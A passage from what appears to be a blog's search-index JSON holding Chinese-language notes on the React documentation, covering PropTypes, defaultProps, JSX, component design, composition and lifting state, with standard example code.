PropTypes.array, optionalBool: PropTypes.bool, optionalFunc: PropTypes.func, optionalNumber: PropTypes.number, optionalObject: PropTypes.object, optionalString: PropTypes.string, optionalSymbol: PropTypes.symbol, // 任何可被渲染的元素（包括数字、字符串、子元素或数组） optionalNode: PropTypes.node, // 一个 React 元素。 optionalElement: PropTypes.element, // 你也可以声明属性是类的一个实例 // 使用 JS 的 instanceof 运算符实现 optionalMessage: PropTypes.instanceOf(Message), // 你可以声明属性是特定的值，类似于枚举 optionalEnum: PropTypes.oneOf(['News', 'Photos']), // 限制它为列举类型之一的对象 optionalUnion: PropTypes.oneOfType([ PropTypes.string, PropTypes.number, PropTypes.instanceOf(Message) ]), // 一个指定元素类型的数组 optionalArrayOf: PropTypes.arrayOf(PropTypes.number), // 一个指定类型的对象 optionalObjectOf: PropTypes.objectOf(PropTypes.number), // 一个指定属性及其类型的对象 optionalObjectWithShape: PropTypes.shape(&#123; color: PropTypes.string, fontSize: PropTypes.number &#125;), // 可以在任何 PropTypes 属性后面加上 isRequired 后缀 // 这样如果这个属性父组件没有提供时，会打印警告信息 requiredFunc: PropTypes.func.isRequired, // 任意类型的数据 requiredAny: PropTypes.any.isRequired, // 可以指定一个自定义验证器。 // 在验证失败时返回一个 Error 对象而不是 `console.warn` 或抛出异常。 // 不过在 oneOfType 中它不起作用。 customProp: function(props, propName, componentName) &#123; if (!/matchme/.test(props[propName])) &#123; return new Error( 'Invalid prop `' + propName + '` supplied to' + ' `' + componentName + '`. Validation failed.' ); &#125; &#125;, // 可以声明 arrayOf 或 objectOf 类型的验证器，在验证失败时返回Error对象。 // 它被用于验证数组或对象的每个值。验证器的前两个参数分别是数组或者对象本身，以及当前元素的键值。 customArrayProp: PropTypes.arrayOf(function(propValue, key, componentName, location, propFullName) &#123; if (!/matchme/.test(propValue[key])) &#123; return new Error( 'Invalid prop `' + propFullName + '` supplied to' + ' `' + componentName + '`. Validation failed.' ); &#125; &#125;)&#125;; 三、限制单个子代 使用 PropTypes.element，你可以指定只传递一个子代： 123456789101112131415161718import PropTypes from 'prop-types';class MyComponent extends React.Component &#123; render() &#123; // 这里必须是一个元素，否则会发出警告。 const children = this.props.children; return ( &lt;div&gt; &#123;children&#125; &lt;/div&gt; ); &#125;&#125;MyComponent.propTypes = &#123; children: PropTypes.element.isRequired&#125;; 四、属性默认值 你可以通过配置 defaultProps 为 props 定义默认值： 123456789101112131415161718class Greeting extends React.Component &#123; render() &#123; return ( &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt; ); &#125;&#125;// 指定 props 的默认值：Greeting.defaultProps = &#123; name: 'Stranger'&#125;;// 渲染为 \"Hello, Stranger\":ReactDOM.render( &lt;Greeting /&gt;, document.getElementById('example')); 如果你在使用像 transform-class-properties 的 Babel 转换器，你也可以在 React 组件类中声明 defaultProps 作为静态属性。这个语法还没有最终通过，在浏览器中需要一步编译工作。更多信息，查看类字段提议。 1234567891011class Greeting extends React.Component &#123; static defaultProps = &#123; name: 'stranger' &#125; render() &#123; return ( &lt;div&gt;Hello, &#123;this.props.name&#125;&lt;/div&gt; ) &#125;&#125; defaultProps 用来确保 this.props.name 在父组件没有特别指定的情况下，有一个初始值。propTypes 的类型检测是在defaultProps 解析之后发生的，因此也会对默认属性 defaultProps 进行类型检测。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之13-深入JSX","slug":"React-gw-13","date":"2018-07-07T18:01:52.000Z","updated":"2018-12-21T15:41:43.465Z","comments":true,"path":"2018/07/08/React-gw-13/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-13/","excerpt":"","text":"一、前言 从本质上讲，JSX 是 React.createElement(component, props, …children) 函数提供的语法糖。 JSX代码: 123&lt;MyButton color=\"blue\" shadowSize=&#123;2&#125;&gt; Click Me&lt;/MyButton&gt; 编译为： 12345React.createElement( MyButton, &#123;color: 'blue', shadowSize: 2&#125;, 'Click Me') 如果不存在子节点，可以使用自闭合标签，如: 1&lt;div className=\"sidebar\" /&gt; 编译为： 12345React.createElement( 'div', &#123;className: 'sidebar'&#125;, null) 二、指定 React 元素类型 JSX 的标签名决定了 React 元素的类型。大写开头的 JSX 标签表示一个 React 组件。这些标签将会被编译为同名变量并被引用，所以如果你使用了 &lt; Foo /&gt; 表达式，则必须在作用域中先声明 Foo 变量。 1、React 必须声明: 由于 JSX 编译后会调用 React.createElement 方法，所以在你的 JSX 代码中必须首先声明 React 变量。 比如，下面两个导入都是必须的，尽管 React 和 CustomButton 都没有在代码中被直接调用。 1234567import React from &apos;react&apos;;import CustomButton from &apos;./CustomButton&apos;;function WarningButton() &#123; // return React.createElement(CustomButton, &#123;color: &apos;red&apos;&#125;, null); return &lt;CustomButton color=&quot;red&quot; /&gt;;&#125; 如果你使用 &lt; script &gt; 加载 React，它将作用于全局。 2、点表示法： 可以使用 JSX 中的点表示法来引用 React 组件。可以方便地从一个模块中导出许多 React 组件。例如，有一个名为 MyComponents.DatePicker 的组件，你可以直接在 JSX 中使用它： 1234567891011import React from 'react';const MyComponents = &#123; DatePicker: function DatePicker(props) &#123; return &lt;div&gt;Imagine a &#123;props.color&#125; datepicker here.&lt;/div&gt;; &#125;&#125;function BlueDatePicker() &#123; return &lt;MyComponents.DatePicker color=\"blue\" /&gt;;&#125; 3、首字母大写： 当元素标签以小写字母开头时，它表示一个内置的组件，如 &lt; div &gt; 或 &lt; span &gt;，并将字符串 ‘div’ 或 ‘span’ 传 递给 React.createElement 。以大写字母开头的标签，如 &lt; Foo /&gt; 会被编译成 React.createElement(Foo) ，并它正对应于你在 JavaScript 文件中定义或导入的组件。 我们建议用大写开头命名组件。如果你的组件以小写字母开头，请在 JSX 中使用之前其赋值给大写开头的变量。 例如下面代码无法按照预期运行: 12345678910111213import React from 'react';// 错误！这是一个组件，首字母应该大写。function hello(props) &#123; // 正确！div 是有效的 HTML 标签。 return &lt;div&gt;Hello &#123;props.toWhat&#125;&lt;/div&gt;;&#125;function HelloWorld() &#123; // 错误！React 会将小写开头的标签名认为是 HTML 原生标签。 return &lt;hello toWhat=\"World\" /&gt;;&#125; 为了修复这个问题，我们将 hello 重命名为 Hello ，并且在引用时使用 &lt; Hello /&gt; ： 123456789101112import React from 'react';// 正确！组件名应该首字母大写。function Hello(props) &#123; // 正确！div 是有效的 HTML 标签。 return &lt;div&gt;Hello &#123;props.toWhat&#125;&lt;/div&gt;;&#125;function HelloWorld() &#123; // 正确！React 能够将大写开头的标签名认为是 React 组件。 return &lt;Hello toWhat=\"World\" /&gt;;&#125; 4、在运行时选择类型： 不能使用表达式作为 React 元素的标签。如果你想使用表达式来表示元素标签，请先将其赋值给大写开头的变量。这通常会出现在根据不同的属性值渲染不同的组件时： 123456789101112import React from 'react';import &#123; PhotoStory, VideoStory &#125; from './stories';const components = &#123; photo: PhotoStory, video: VideoStory&#125;;function Story(props) &#123; // 错误！JSX 标签名不能为一个表达式。 return &lt;components[props.storyType] story=&#123;props.story&#125; /&gt;;&#125; 为了解决这个问题，需要将表达式赋值给一个以大写字母开头的变量: 12345678910111213import React from 'react';import &#123; PhotoStory, VideoStory &#125; from './stories';const components = &#123; photo: PhotoStory, video: VideoStory&#125;;function Story(props) &#123; // 正确！JSX 类型可以是一个以大写字母开头的变量. const SpecificStory = components[props.storyType]; return &lt;SpecificStory story=&#123;props.story&#125; /&gt;;&#125; 三、JSX 中的 属性 在 JSX 中有几种不同的方式来指定属性 props： 1、使用 JavaScript 表达式： 你可以传递任何 {} 包裹的 JavaScript 表达式作为一个属性值。例如，在这个 JSX 中： 1&lt;MyComponent foo=&#123;1 + 2 + 3 + 4&#125; /&gt; 对于 MyComponent 来讲，props.foo 的值为 10，这是 1 + 2 + 3 + 4 表达式计算得出的。 在 JavaScript 中，if 语句和 for 循环不是表达式，因此不能在 JSX 中直接使用。但你可以将他们放在附近的代码块中，例如: 123456789function NumberDescriber(props) &#123; let description; if (props.number % 2 == 0) &#123; description = &lt;strong&gt;even&lt;/strong&gt;; &#125; else &#123; description = &lt;i&gt;odd&lt;/i&gt;; &#125; return &lt;div&gt;&#123;props.number&#125; is an &#123;description&#125; number&lt;/div&gt;;&#125; 2、字符串常量： 你可以将字符串常量作为属性值传递。下面这两个 JSX 表达式是等价的： 123&lt;MyComponent message=\"hello world\" /&gt;&lt;MyComponent message=&#123;'hello world'&#125; /&gt; 当传递一个字符串常量时，该值会被解析为 HTML 非转义字符串。 所以下面两个 JSX 表达式是等效的： 123&lt;MyComponent message=\"&amp;lt;3\" /&gt;&lt;MyComponent message=&#123;'&lt;3'&#125; /&gt; 这种行为通常是无意义的，提到它只是为了完整性。 3、props 默认为 true: 如果你没给属性传值，它默认为 true 。下面两个 JSX 表达式是等价的： 123&lt;MyTextBox autocomplete /&gt;&lt;MyTextBox autocomplete=&#123;true&#125; /&gt; 一般情况下不建议这样使用，因为它会与 ES6对象简洁表示法 混淆。比如 {foo} 是 {foo: foo} 的简写，而不是 {foo: true}。这里能这样用，是因为它符合 HTML 的做法。 4、属性扩展： 如果你已经有一个 object 类型的 props，并且想在 JSX 中传递它，你可以使用扩展操作符 … 传入整个 props 对象。这两个组件是等效的： 12345678function App1() &#123; return &lt;Greeting firstName=\"Ben\" lastName=\"Hector\" /&gt;;&#125;function App2() &#123; const props = &#123;firstName: 'Ben', lastName: 'Hector'&#125;; return &lt;Greeting &#123;...props&#125; /&gt;;&#125; 当你构建通用容器时，属性扩展非常有用。然而，这样做也可能让很多不相关的属性，传递到不需要它们的组件中使代码变得混乱。我们建议你谨慎使用此语法。 四、JSX 中的 Children 在 JSX 表达式中可以包含开始标签和闭合标签，标记间的内容作为特殊的参数传递：props.children，下面有几种方式传递 children ： 1、字符串常量： 可以在开始标签和闭合标签中放入一个字符串，那么 props.children 就是那个字符串。这对于内置很多 HTML 元素时非常有用，例如: 1&lt;MyComponent&gt;Hello world!&lt;/MyComponent&gt; 这是有效的 JSX，MyComponent 组件中的 props.children 值为字符串 “Hello world!”。因为 HTML 未转义，所以你可以像写 HTML 一样写 JSX： 1&lt;div&gt;This is valid HTML &amp;amp; JSX at the same time.&lt;/div&gt; JSX 会移除空行和开始与结尾处的空格，邻接标签的空行也会被移除，字符串之间的空格会被压缩成一个空格，因此下面的渲染效果都是相同的： 123456789101112131415&lt;div&gt;Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt; 2、JSX: 你可以提供多个 JSX 元素作为 children。这对于嵌套显示组件非常有用： 1234&lt;MyContainer&gt; &lt;MyFirstComponent /&gt; &lt;MySecondComponent /&gt;&lt;/MyContainer&gt; 你可以混合不同类型的子元素，所同时用字符串常量和 JSX 子元素。这是 JSX 与 HTML 另一点相似的地方，因此下面的 HTML 和 JSX 均是有效的： 1234567&lt;div&gt; Here is a list: &lt;ul&gt; &lt;li&gt;Item 1&lt;/li&gt; &lt;li&gt;Item 2&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; React 组件也可以通过数组的形式返回多个元素： 123456789render() &#123; // 不需要使用额外的元素包裹数组中的元素 return [ // 不要忘记 key &lt;li key=\"A\"&gt;First item&lt;/li&gt;, &lt;li key=\"B\"&gt;Second item&lt;/li&gt;, &lt;li key=\"C\"&gt;Third item&lt;/li&gt;, ];&#125; 3、JavaScript 表达式： 通过使用 {} 包裹，你可以将任何的 JavaScript 表达式作为 children 传递，下面表达式是等价的: 123&lt;MyComponent&gt;foo&lt;/MyComponent&gt;&lt;MyComponent&gt;&#123;'foo'&#125;&lt;/MyComponent&gt; 这对于渲染长度不定的 JSX 表达式列表非常有用。例如，这渲染了一个 HTML 列表： 123456789101112function Item(props) &#123; return &lt;li&gt;&#123;props.message&#125;&lt;/li&gt;;&#125;function TodoList() &#123; const todos = ['finish doc', 'submit pr', 'nag dan to review']; return ( &lt;ul&gt; &#123;todos.map((message) =&gt; &lt;Item key=&#123;message&#125; message=&#123;message&#125; /&gt;)&#125; &lt;/ul&gt; );&#125; JavaScript 表达式可以和其他类型的子元素混用，这对于字符串模板非常有用： 123function Hello(props) &#123; return &lt;div&gt;Hello &#123;props.addressee&#125;!&lt;/div&gt;;&#125; 4、函数: 通常情况下，嵌入到 JSX 中的 JavaScript 表达式会被认为是一个字符串、React元素 或者是这些内容的列表。然而，props.children 可以像其它属性一样传递任何数据，而不仅仅是 React 元素。例如，如果你使用自定义组件，其 props.children 的值可以是回调函数： 12345678910111213141516// Calls the children callback numTimes to produce a repeated componentfunction Repeat(props) &#123; let items = []; for (let i = 0; i &lt; props.numTimes; i++) &#123; items.push(props.children(i)); &#125; return &lt;div&gt;&#123;items&#125;&lt;/div&gt;;&#125;function ListOfTenThings() &#123; return ( &lt;Repeat numTimes=&#123;10&#125;&gt; &#123;(index) =&gt; &lt;div key=&#123;index&#125;&gt;This is item &#123;index&#125; in the list&lt;/div&gt;&#125; &lt;/Repeat&gt; );&#125; 传递到自定义组件的子元素可以是任何元素，只要在渲染之前组件可以将其转化为 React 能够处理的东西即可。这种用法并不常见，但是如果你需要扩展 JSX 的话，则会非常有用。 5、Booleans, Null, 和 Undefined 被忽略: false，null，undefined，和 true 都是有效的子元素，但它们不会直接被渲染，下面的JSX表达式渲染效果是相同的： 1234567891011&lt;div /&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&#123;false&#125;&lt;/div&gt;&lt;div&gt;&#123;null&#125;&lt;/div&gt;&lt;div&gt;&#123;undefined&#125;&lt;/div&gt;&lt;div&gt;&#123;true&#125;&lt;/div&gt; 这在根据条件来确定是否渲染React元素时非常有用。如下如果 showHeader 为 true 时，&lt; Header /&gt;会被渲染： 1234&lt;div&gt; &#123;showHeader &amp;&amp; &lt;Header /&gt;&#125; &lt;Content /&gt;&lt;/div&gt; 值得注意的是，JavaScript 中的一些 “falsy” 值(比如数字0)，它们依然会被渲染。例如，下面的代码不会按照你预期的发生，因为当 props.messages 是空数组时 0 会被打印： 12345&lt;div&gt; &#123;props.messages.length &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; 要修复这个问题，确保 &amp;&amp; 之前的表达式总是布尔值： 12345&lt;div&gt; &#123;props.messages.length &gt; 0 &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; 反过来，如果在输出中想要渲染 false ，true，null 或者 undefined ，你必须先将其转化为字符串: 123&lt;div&gt; My JavaScript variable is &#123;String(myVariable)&#125;.&lt;/div&gt; 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之12-react的编程思想","slug":"React-gw-12","date":"2018-07-07T17:01:52.000Z","updated":"2019-01-25T10:18:40.929Z","comments":true,"path":"2018/07/08/React-gw-12/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-12/","excerpt":"","text":"一、前言 在我们看来，React 是 JavaScript 构建大型、高性能 Web 应用的首选。在 Facebook 和 Instagram 中都能很好的应用。 React 中重要部分之一是如何构建应用程序。下面将引导完成用 React 构建一个可搜索的产品数据表的思考过程。 二、从模拟页面开始 试想我们已经有一个 JSON 接口，和从设计者那里得来的一个原型图: JSON 接口返回的数据如下： 12345678[ &#123;category: \"Sporting Goods\", price: \"$49.99\", stocked: true, name: \"Football\"&#125;, &#123;category: \"Sporting Goods\", price: \"$9.99\", stocked: true, name: \"Baseball\"&#125;, &#123;category: \"Sporting Goods\", price: \"$29.99\", stocked: false, name: \"Basketball\"&#125;, &#123;category: \"Electronics\", price: \"$99.99\", stocked: true, name: \"iPod Touch\"&#125;, &#123;category: \"Electronics\", price: \"$399.99\", stocked: false, name: \"iPhone 5\"&#125;, &#123;category: \"Electronics\", price: \"$199.99\", stocked: true, name: \"Nexus 7\"&#125;]; 三、步骤1：将UI划分组件层级 要做的第一件事是用方框划分出每一个组件(和子组件)并给他们命名。如果你和设计师一起工作，他们可能已经做了这些工作，所以去和他们交流一下！他们的 Photoshop 图层名称可能最终成为你的 React 组件名称！ 然后该如何拆分组件呢？只需要像拆分一个新方法或新对象一样的方式即可。一个常用的技巧是单一职责原则，即一个组件理想情况下只处理一件事。如果这个组件功能不断丰富，它应该被分成更小的组件。 由于经常向用户显示 JSON 数据模型，你会发现如果模型构建正确，对应的 UI（以及组件结构）会被很好地映射。这是因为 UI 和数据模型往往遵循相同的信息结构，这意味着将 UI 划分成组件的工作往往是很容易的。只要把它划分成能准确表示你数据模型的一部分的组件就可以。 可以看到，在这个简单的小应用中，有5个组件。对每个组件代表的数据进行了斜体标注： a、FilterableProductTable （orange）： 包含整个示例 b、SearchBar（蓝色）： 接收所有的用户输入 c、ProductTable（绿色）： 根据用户输入显示和过滤数据集合 d、ProductCategoryRow（宝石绿）： 显示每个类别的标题 e、ProductRow（红色）： 显示每个产品的行数据 观察 ProductTable ，会发现表头（包含Name和Price标签）不是独立的组件。这是个人偏好问题，当然也存在用其他方式实现的争论。在这个例子中，将其作为 ProductTable 的一部分来处理，因为它是数据集合渲染的一部分，是 ProductTable 的职责。当然，如果这个表头变得复杂的时候（比如，如果需要添加排序功能），这时候创建一个独立的 ProductTableHeader 组件更合适。 现在我们已经在原型图中做了标识，接下来对它们进行层级结构排列。这很简单。原型图中的子组件在层级结构中应该作为子节点： 12345FilterableProductTable SearchBar ProductTable ProductCategoryRow ProductRow 四、步骤2：用React构建一个静态版本 已经有了组件层次结构，是时候实现应用了。最简单的方法是构建一个采用数据模型并渲染 UI，但没有交互性的版本。最好解耦这些处理，因为构建静态版本需要 大量的代码和少量的思考，而添加交互需要大量思考和少量的代码。 要构建应用的静态版本，用于渲染数据模型，需要创建能够复用其他组件的组件，并通过 props 来传递数据。props 是将数据从父级组件传递到子级的一种方式。如果你熟悉 state ，在构建静态版本时 不要使用 state ，state 只用于交互，也就是说，数据可以随时被改变。由于这是一个静态版本，所以你并不需要使用 state 。 可以自上而下或自下而上构建。即可以从构建层次结构中顶端的组件开始（即从 FilterableProductTable 开始），也可以从构建层次结构中底层的组件开始（即 ProductRow ）。在更简单的例子中，通常自上而下更容易，而在较大的项目中，自下而上，更有利于编写测试。 在这一步结束时，你已经有了一个可重用的组件库，用于渲染你的数据模型。这些组件将只会有 render() 方法，因为这是你应用程序的静态版本。层次结构顶部的组件（ FilterableProductTable ）应该接收你的数据模型作为 prop 。如果你对基础数据模型进行更改，并再次调用 ReactDOM.render()，UI 将同步更新。这有利于观测UI的更新以及相关的数据变化，因为这中间没有做什么复杂的事情。React 的 单向数据流（也称为单向绑定）保证了一切是模块化并且是快速的。 五、步骤3：确定UI状态的最小（但完整）表示 为了 UI 可以交互，需要能够触发更改底层的数据模型。React 通过 state 使其变得容易。 要正确的构建应用程序，首先需要考虑你的应用程序需要的最小可变状态集。这里的关键是：不要重复。找出应用程序所需 state 的绝对最小表示，并且可以以此计算出你所需的所有其他数据内容。例如，如果构建一个 TODO 列表，只保留一个 TODO 元素数组即可;不需要为元素数量保留一个单独的 state 变量。相反，当你要渲染 TODO 计数时，只需要获取 TODO 数组的长度即可。 我们的示例应用中的数据，有： a、原始产品列表 b、用户输入的搜索文本 c、复选框的值 d、过滤后的产品列表 分析每一个数据，弄清楚哪一个是 state。每个数据考虑3个问题： a、是否通过 props 从父级传入？如果是这样，它可能不是 state。 b、是否永远不会发生变化？如果是这样，它可能不是 state 。 c、是否可以由组件中其他的 state 或 props 计算得出？如果是这样，则它不是 state 。 原始的产品列表作为 props 传递，所以它不是 state 。搜索文本和复选框似乎是 state ，因为它们会根据用户的输入发生变化，并且不能从其他数据计算得出。最后，过滤后的产品列表不是 state ，因为它可以通过结合 原始产品列表 与 搜索文本 和 复选框的值 计算得出。 所以最终，我们的 state 是： a、用户输入的搜索文本 b、复选框的值 六、步骤4：确定state的位置 已经确定了应用所需 state 的最小集合。接下来，需要确定是哪个组件可变，或者说哪个组件拥有这些 state 。 记住：React 单向数据流在层级中自上而下进行。这样有可能不能立即判断出状态属于哪个组件。试着按下面的步骤分析操作： 对于你应用中的每一个 state ： a、确定每一个需要这个 state 来渲染的组件。 b、找出公共父级组件（一个单独的组件，在组件层级中位于所有需要这个 state 的组件的上面）。 c、这个公共父级组件或另一个层级更高的组件应该拥有这个 state。 d、如果找不出一个拥有该 state 的组件，创建一个简单的新组件来保留这个 state ，并将其添加到公共父级组件的上层即可。 我们在我们的应用中贯穿这个策略： a、ProductTable 需要基于 state 过滤产品列表，SearchBar 需要显示搜索文本和选中状态 state 。 b、公共的父级组件是 FilterableProductTable c、筛选文本和复选框的值应该放在 FilterableProductTable。 那么我们已经决定 state 保存在 FilterableProductTable 中。首先，添加一个实例属性 this.state = {filterText: ‘’, inStockOnly: false} 到 FilterableProductTable 的constructor 来反映你应用的初始 state 。然后，传递 filterText 和 inStockOnly 到 ProductTable 和 SearchBar 作为一个 prop 。最后，使用这些 props 来过滤 ProductTable 中的行，并设置 SearchBar 中的表单字段的值。 现在你能够看到你的应用是如何运作的了：设置 filterText 为 “ball” 并刷新你的应用。你将发现数据表被正确的更新。 七、步骤5：添加反向数据流 到目前为止，我们创建了一个可以正确渲染的应用程序，它的数据在层级中通过函数的 props 和 state 向下流动。现在是时候支持其他方式的数据流了：层次结构中深层的 form(表单) 组件需要更新 FilterableProductTable 中的 state 。 React 中明确的数据流向，使你容易理解程序如何运行。但是相比传统的数据双向绑定来说，的确需要多敲一些代码。 在当前版本的示例中，如果你试图键入或选中复选框，你发现 React 会忽略了你的输入。这是故意的，因为我们把 input 的 value 属性设置为一直等于从 FilterableProductTable 传入的 state。 想想我们要做什么。我们期望当用户改变表单输入的时候，我们更新 state 来反映用户的输入。由于组件只能更新它们自己的 state ，FilterableProductTable 将传递一个回调函数到 SearchBar，然后在 state 被更新的时候触发。我们可以使用 input 的 onChange 事件来调用它。FilterableProductTable 传入的回调函数会调用 setState()，这时应用程序会被更新。 尽管这听起来很复杂，但真的只需要简单的几行代码即可实现。同时清晰的表达数据在应用中的流动。 八、总结 使用 React 构建组件和应用的想法。有可能这种写法会比你通常的写法多几行代码，但阅读代码的重要性远远高于写代码，模块化、结构清晰的代码最利于阅读。当创建一个大组件库的时候，你将感激模块化、结构清晰和可以重用的代码，同时你的代码行数会慢慢减少。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之11-组合VS继承","slug":"React-gw-11","date":"2018-07-07T17:01:48.000Z","updated":"2018-07-07T17:06:30.402Z","comments":true,"path":"2018/07/08/React-gw-11/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-11/","excerpt":"","text":"一、前言 React 拥有一个强大的组合模型，我们建议使用组合而不是继承以实现代码的重用。 二、包含 一些组件不能提前知道它们的子组件是什么，尤其在 Sidebar 和 Dialog 等通用 “容器” 中比较常见。我们建议这种组件使用特别的 children 属性将子元素直接传递到输出： 1234567function FancyBorder(props) &#123; return ( &lt;div className=&#123;'FancyBorder FancyBorder-' + props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; );&#125; 这允许其他组件通过嵌套 JSX 传递任意子组件给他们： 123456789101112function WelcomeDialog() &#123; return ( &lt;FancyBorder color=\"blue\"&gt; &lt;h1 className=\"Dialog-title\"&gt; Welcome &lt;/h1&gt; &lt;p className=\"Dialog-message\"&gt; Thank you for visiting our spacecraft! &lt;/p&gt; &lt;/FancyBorder&gt; );&#125; 在 WelcomeDialog 组件， &lt; FancyBorder &gt; JSX 标签中的任何内容被传递到 FancyBorder 组件中，作为一个 children 属性。由于 FancyBorder 渲染 {props.children} 到一个 &lt; div &gt; 中，传递的元素会呈现在最终的输出中。 虽然不太常见，但有时你可能需要在组件中有多个入口，这种情况下你可以使用自己约定的属性而不是 children： 123456789101112131415161718192021222324function SplitPane(props) &#123; return ( &lt;div className=\"SplitPane\"&gt; &lt;div className=\"SplitPane-left\"&gt; &#123;props.left&#125; &lt;/div&gt; &lt;div className=\"SplitPane-right\"&gt; &#123;props.right&#125; &lt;/div&gt; &lt;/div&gt; );&#125;function App() &#123; return ( &lt;SplitPane left=&#123; &lt;Contacts /&gt; &#125; right=&#123; &lt;Chat /&gt; &#125; /&gt; );&#125; 如 &lt; Contacts /&gt; 和 &lt; Chat /&gt; 等 React 元素本质上都是对象，所以可以将其像其他数据一样作为 props(属性) 传递使用。 三、特例 有时候，我们考虑组件作为其它组件的“特殊情况”。例如，我们可能说一个 WelcomeDialog 是 Dialog 的一个特殊用例。 在React中，可以使用组合来实现，一个偏“特殊”的组件渲染出一个偏“通用”的组件，可通过 props 配置它： 123456789101112131415161718192021function Dialog(props) &#123; return ( &lt;FancyBorder color=\"blue\"&gt; &lt;h1 className=\"Dialog-title\"&gt; &#123;props.title&#125; &lt;/h1&gt; &lt;p className=\"Dialog-message\"&gt; &#123;props.message&#125; &lt;/p&gt; &lt;/FancyBorder&gt; );&#125;function WelcomeDialog() &#123; return ( &lt;Dialog title=\"Welcome\" message=\"Thank you for visiting our spacecraft!\" /&gt; );&#125; 组合对于定义为类的组件同样适用： 1234567891011121314151617181920212223242526272829303132333435363738394041424344function Dialog(props) &#123; return ( &lt;FancyBorder color=\"blue\"&gt; &lt;h1 className=\"Dialog-title\"&gt; &#123;props.title&#125; &lt;/h1&gt; &lt;p className=\"Dialog-message\"&gt; &#123;props.message&#125; &lt;/p&gt; &#123;props.children&#125; &lt;/FancyBorder&gt; );&#125;class SignUpDialog extends React.Component &#123; constructor(props) &#123; super(props); this.handleChange = this.handleChange.bind(this); this.handleSignUp = this.handleSignUp.bind(this); this.state = &#123;login: ''&#125;; &#125; render() &#123; return ( &lt;Dialog title=\"Mars Exploration Program\" message=\"How should we refer to you?\"&gt; &lt;input value=&#123;this.state.login&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;button onClick=&#123;this.handleSignUp&#125;&gt; Sign Me Up! &lt;/button&gt; &lt;/Dialog&gt; ); &#125; handleChange(e) &#123; this.setState(&#123;login: e.target.value&#125;); &#125; handleSignUp() &#123; alert(`Welcome aboard, $&#123;this.state.login&#125;!`); &#125;&#125; 四、如何看待继承 在 Facebook 网站上 ，我们的 React 使用了数以千计的组件，然而却还未发现任何需要推荐你使用继承的情况。 使用 props 和 组合已经足够灵活来明确、安全的定制一个组件的外观和行为。切记，组件可以接受任意的 props ，包括原始值、React 元素，或者函数。 如果要在组件之间重用非UI功能，我们建议将其提取到单独的 JavaScript 模块中。组件可以导入它并使用该函数，对象或类，而不扩展它。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之10-状态提升","slug":"React-gw-10","date":"2018-07-07T17:01:44.000Z","updated":"2019-01-25T10:18:28.185Z","comments":true,"path":"2018/07/08/React-gw-10/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-10/","excerpt":"","text":"一、引入 使用 react 经常会遇到几个组件需要共用状态数据的情况。 我们建议提升共享的状态到它们最近的祖先组件中进行管理。 来个例子，我们创建一个温度计算器，用来计算水在一个给定温度下是否会沸腾。 首先，我们创建一个名为 BoilingVerdict 的组件。它接受 celsius（摄氏温度）作为 prop ，并返回是否足以使水沸腾： 123456function BoilingVerdict(props) &#123; if (props.celsius &gt;= 100) &#123; return &lt;p&gt;The water would boil.&lt;/p&gt;; &#125; return &lt;p&gt;The water would not boil.&lt;/p&gt;;&#125; 接下来，我们创建一个名为 Calculator 组件。它渲染一个 &lt; input &gt; 来接收用户输入，并在 this.state.temperature 中保存它的值。 另外，它会根据当前输入的温度来渲染 BoilingVerdict: 123456789101112131415161718192021222324252627class Calculator extends React.Component &#123; constructor(props) &#123; super(props); this.handleChange = this.handleChange.bind(this); this.state = &#123;temperature: ''&#125;; &#125; handleChange(e) &#123; this.setState(&#123;temperature: e.target.value&#125;); &#125; render() &#123; const temperature = this.state.temperature; return ( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in Celsius:&lt;/legend&gt; &lt;input value=&#123;temperature&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;BoilingVerdict celsius=&#123;parseFloat(temperature)&#125; /&gt; &lt;/fieldset&gt; ); &#125;&#125; 二、添加第二个输入框 添加新需求，除了一个摄氏温度输入之外，我们再提供了一个华氏温度输入，并且两者保持自动同步。 可以通过从 Calculator 组件中抽离一个 TemperatureInput 组件出来。 并给它添加一个新的 scale 属性，值可能是 “c” 或者 “f” ： 12345678910111213141516171819202122232425262728const scaleNames = &#123; c: 'Celsius', f: 'Fahrenheit'&#125;;class TemperatureInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleChange = this.handleChange.bind(this); this.state = &#123;temperature: ''&#125;; &#125; handleChange(e) &#123; this.setState(&#123;temperature: e.target.value&#125;); &#125; render() &#123; const temperature = this.state.temperature; const scale = this.props.scale; return ( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in &#123;scaleNames[scale]&#125;:&lt;/legend&gt; &lt;input 